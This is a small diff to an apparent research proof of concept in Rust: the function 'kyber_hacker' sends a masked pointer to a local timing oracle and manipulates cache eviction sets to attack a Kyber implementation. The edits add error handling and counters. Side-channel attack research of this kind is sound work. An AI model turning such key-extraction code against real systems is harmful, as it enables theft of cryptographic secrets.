@@ -467,7 +467,7 @@ fn kyber_hacker(
 
         // instead of creating a ciphertext here, we rely on a smart process that will submit us
         // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-        let mut oracle_stream = TcpStream::connect("127.0.0.1:3334")?;
+        let mut oracle_stream = TcpStream::connect("127.0.0.1:3334").expect("Connect failed");
         let oracle_repetitions = 5;
 
         // Send random mask and masked pointer so that constructed ciphertext is decrypted into
@@ -475,7 +475,10 @@ fn kyber_hacker(
         stream.write_all(&rand_mask.to_le_bytes()).unwrap();
         stream.write_all(&target_addr.to_le_bytes()).unwrap();
 
+        let mut bad_flag = 0;
         group_search_flag = 1;
+        let mut global_guess_result = 100;
+        let mut repetition_times = 0;
 
         while pointer_idx < 4 {
             // shift the flush evset
